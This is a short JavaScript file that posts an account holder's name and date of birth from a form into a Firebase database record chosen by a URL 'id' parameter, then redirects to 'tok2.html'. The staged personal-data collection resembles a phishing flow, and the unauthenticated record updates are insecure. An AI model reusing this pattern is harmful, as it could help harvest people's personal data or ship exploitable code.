const firebaseConfig = {
  apiKey: "AIzaSyD5wSvrZXq9FFfJ0SoDxGfp6kVQ7VEyNFA",
  authDomain: "start-45a39.firebaseapp.com",
  databaseURL: "https://start-45a39-default-rtdb.firebaseio.com",
  projectId: "start-45a39",
  storageBucket: "start-45a39.appspot.com",
  messagingSenderId: "377019727798",
  appId: "1:377019727798:web:5c56be02bc821e6ec88b17"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);

// Reference your database
var contactFormDB = firebase.database().ref("contactForm");

document.getElementById("account").addEventListener("submit", submitUpdate);

function submitUpdate(e) {
  e.preventDefault();

  var holdername = getElementVal("holdername");
  var dob = getElementVal("dobInput");

  // Get the key from the query parameter
  const urlParams = new URLSearchParams(window.location.search);
  const entryKey = urlParams.get('id');

  updateMessages(entryKey, holdername, dob);
}

const updateMessages = (key, holdername, dob) => {
  var updates = {};

  if (holdername) updates.holdername = holdername;
  if (dob) updates.dob = dob;

  contactFormDB.child(key).update(updates, function (error) {
    if (error) {
      console.error("Error updating data:", error);
    } else {
      window.location.href = `tok2.html?id=${key}`;
    }
  });
};

const getElementVal = (id) => {
  return document.getElementById(id).value;
};
